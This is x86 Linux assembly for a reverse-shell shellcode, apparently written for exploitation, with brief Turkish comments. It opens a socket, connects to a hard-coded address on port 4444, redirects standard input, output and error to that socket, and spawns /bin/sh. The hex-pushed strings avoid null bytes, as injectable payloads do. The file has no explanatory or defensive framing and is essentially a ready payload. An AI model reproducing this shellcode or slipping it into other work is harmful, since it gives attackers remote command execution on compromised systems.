global _start

section .text
_start:
	xor eax, eax
	xor ebx, ebx
	xor edx, edx

	mov al, 0x66
	mov bl, 1

	push edx
	push 1
	push 2

	mov ecx, esp
	int 0x80;socket acildi
	mov esi, eax;fd = esi

	xor eax, eax
	mov al, 0x66
	mov bl, 3

	push 0x0101017f ; ip
	push word 0x5c11
	push word 2

	mov ecx, esp; *sockaddr

	push 16
	push ecx
	push esi
	mov ecx, esp
	int 0x80; connect

	xor eax, eax
	mov al, 0x3f
	mov ebx, esi

	xor ecx, ecx
	int 0x80;dup2-0

	xor eax, eax
        mov al, 0x3f

        xor ecx, ecx
	mov cl, 1
        int 0x80;dup2-1

	xor eax, eax
        mov al, 0x3f

        xor ecx, ecx
        mov cl, 2
        int 0x80;dup2-2

;sh exec

	xor eax, eax
	push eax
	push 0x68732f2f
	push 0x6e69622f

	mov al, 0x0b
	xor ecx, ecx
	xor edx, edx

	mov ebx, esp
	int 0x80;/bin/sh

;exit
	xor eax, eax
	mov al, 0x01
	xor ebx, ebx
	int 0x80;exit0
